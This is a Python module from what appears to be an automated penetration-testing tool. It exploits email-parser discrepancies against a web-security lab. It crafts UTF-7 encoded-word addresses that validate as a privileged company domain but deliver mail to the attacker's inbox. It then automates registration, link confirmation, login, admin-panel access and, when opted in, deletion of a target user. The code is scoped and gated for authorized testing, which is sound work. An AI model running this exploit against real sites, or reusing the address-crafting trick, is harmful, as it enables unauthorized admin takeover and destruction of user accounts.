"""
Email-parser-discrepancy flow ("Splitting the email atom").

Signup is restricted to a privileged company domain, but the *validator* and the
*mailer* parse addresses with different libraries. The validator reads the literal
domain after the last '@'; the mailer additionally decodes RFC 2047 encoded-words
in the local part and re-parses the result. So an address like

    =?utf-7?q?you&AEA-<your-inbox>&ACA-?=@company.tld

passes validation as '@company.tld' (privileged) while the mailer decodes
'&AEA-'(@) and '&ACA-'(space), re-parses 'you@<your-inbox> ', and delivers the
confirmation to YOUR inbox - letting you register a privileged account you control.

Chain: register the crafted address -> read the confirmation link from the email
client -> confirm -> log in -> reach /admin -> (opt-in) delete the objective user.
"""

from __future__ import annotations

import logging
import re
import secrets
from urllib.parse import urlparse

from ..core.scope import Scope, ScopeError
from ..engine.http_client import RateLimiter, ScopedClient
from ..testing.schema import Severity, TestCase, TestStep, VulnClass, Verdict

logger = logging.getLogger("venom.flows.email_parser")

_CSRF = re.compile(r'name=["\']?csrf["\']?[^>]*?value=["\']?([^"\'\s>]+)')
_PRIV = re.compile(r'@([A-Za-z0-9.-]+\.[A-Za-z]{2,})')
_LINK = re.compile(r'https?://[^\s"\'<>]+')


def _csrf(t): m = _CSRF.search(t or ""); return m.group(1) if m else None


def _scrape_priv(html: str) -> str:
    for dom in _PRIV.findall(html or ""):
        d = dom.lower().rstrip(".")
        if "noreply" not in d and "no-reply" not in d:
            return d
    return ""


def _craft(local: str, inbox_domain: str, priv: str) -> str:
    # UTF-7 encoded-word: &AEA- = '@', &ACA- = ' ' (space terminates the mailer's domain).
    return f"=?utf-7?q?{local}&AEA-{inbox_domain}&ACA-?=@{priv}"


def _find_confirm(inbox_html: str, recipient: str, lab_host: str) -> str | None:
    i = (inbox_html or "").find(recipient)
    near = inbox_html[i:i + 6000] if i >= 0 else (inbox_html or "")
    for m in _LINK.finditer(near):
        url = m.group(0).rstrip('"\'<>)')
        low = url.lower()
        if lab_host in url and ("token" in low or "confirm" in low or "register?" in low):
            return url
    return None


def _rel(url: str):
    p = urlparse(url)
    return p.path + (f"?{p.query}" if p.query else "")


def _find_delete(admin_html: str, target: str):
    m = re.search(r'href=["\']([^"\']*delete[^"\']*username=)[^"\'&]*["\']', admin_html or "")
    return (m.group(1) + target) if m else None


async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
    if not scope.email_client_url:
        return []
    if not any(e.path.rstrip("/").endswith("/register") for e in registry):
        return []

    lab_base = scope.authorized_base_urls[0]
    lab_host = urlparse(lab_base).hostname or ""
    ec = urlparse(scope.email_client_url)
    email_base = f"{ec.scheme}://{ec.netloc}"
    inbox_domain = ec.hostname or ec.netloc
    limiter = RateLimiter(scope.rate_limit_per_second)

    try:
        lab = ScopedClient(scope, lab_base, role="eparser", limiter=limiter, transport=transport)
        mail = ScopedClient(scope, email_base, role="eparser-mail", limiter=limiter, transport=transport)
    except ValueError as exc:
        logger.warning("email-parser skipped: %s (authorize the email host)", exc)
        return []

    steps: list[TestStep] = []
    local = "venom" + secrets.token_hex(3)
    user = "venom" + secrets.token_hex(3)
    pw = "Passw0rd!" + secrets.token_hex(2)
    recipient = f"{local}@{inbox_domain}"
    try:
        reg = await lab.request("GET", "/register", follow_redirects=True)
        reg_html = reg.text if reg else ""
        priv = (scope.privileged_email_domain or _scrape_priv(reg_html)).lower().rstrip(".")
        if not priv:
            logger.info("email-parser: no privileged domain found - skipping")
            return []
        email = _craft(local, inbox_domain, priv)
        steps.append(TestStep(step=1, description=f"GET /register (priv domain @{priv})",
                              method="GET", path="/register", actual_status=getattr(reg, "status_code", None)))

        logger.info("email-parser: registering UTF-7 atom-split email validating as @%s, "
                    "delivering to %s", priv, recipient)
        await lab.request("POST", "/register", data={
            "csrf": _csrf(reg_html), "username": user, "email": email, "password": pw},
            follow_redirects=True)
        steps.append(TestStep(step=2, description="register parser-discrepancy email",
                              method="POST", path="/register"))

        inbox = await mail.request("GET", ec.path or "/email", follow_redirects=True)
        link = _find_confirm(inbox.text if inbox else "", recipient, lab_host)
        if not link:
            logger.info("email-parser: no confirmation link for %s - discrepancy failed", recipient)
            return []
        cr = await lab.request("GET", _rel(link), follow_redirects=True)
        steps.append(TestStep(step=3, description="confirm via inbox link", method="GET",
                              path=urlparse(link).path, actual_status=getattr(cr, "status_code", None)))

        lgp = await lab.request("GET", "/login")
        await lab.request("POST", "/login", data={
            "csrf": _csrf(lgp.text if lgp else ""), "username": user, "password": pw},
            follow_redirects=True)
        steps.append(TestStep(step=4, description=f"log in as '{user}'", method="POST", path="/login"))

        adm = await lab.request("GET", "/admin", follow_redirects=False)
        adm_ok = adm is not None and adm.status_code == 200
        steps.append(TestStep(step=5, description="access /admin panel", method="GET", path="/admin",
                              actual_status=getattr(adm, "status_code", None)))
        if not adm_ok:
            logger.info("email-parser: /admin not reachable (status=%s)", getattr(adm, "status_code", None))
            return []

        solved = False
        objective = scope.objective_delete_user
        if objective and scope.allow_destructive:
            delpath = _find_delete(adm.text, objective) or f"/admin/delete?username={objective}"
            dr = await lab.request("GET", delpath, follow_redirects=True, destructive=True)
            hm = await lab.request("GET", "/", follow_redirects=True)
            solved = bool(hm and "is-solved" in (hm.text or ""))
            steps.append(TestStep(step=6, description=f"delete user '{objective}' (objective)",
                                  method="GET", path=delpath,
                                  actual_status=getattr(dr, "status_code", None), destructive=True))

        note = ("LAB SOLVED (is-solved)" if solved else
                ("admin access achieved; destructive objective not run" if objective else
                 "admin access achieved"))
        verdict = Verdict.CONFIRMED_EXPLOIT if (adm_ok and (solved or not objective)) else Verdict.NEEDS_REVIEW
        return [TestCase(
            test_id="EMP-001",
            vulnerability_class=VulnClass.PRIV_ESCALATION,
            hypothesis=("Email parser discrepancy: the signup validator reads the literal domain "
                        f"(@{priv}) while the mailer decodes an RFC 2047 UTF-7 encoded-word in the "
                        "local part and delivers to an attacker inbox, so a privileged-domain "
                        "account can be registered and controlled -> admin access."),
            risk_rating=Severity.CRITICAL,
            affected_endpoint="POST /register",
            business_impact="Register a privileged (staff) account from an unauthorized domain -> admin takeover.",
            steps=steps,
            origin="flow",
            verdict=verdict,
            notes=[note],
            rag_source="PortSwigger: email parser discrepancies / Splitting the email atom",
        )]
    except ScopeError as exc:
        logger.warning("email-parser blocked by scope: %s", exc)
        return []
    finally:
        await lab.aclose()
        await mail.aclose()
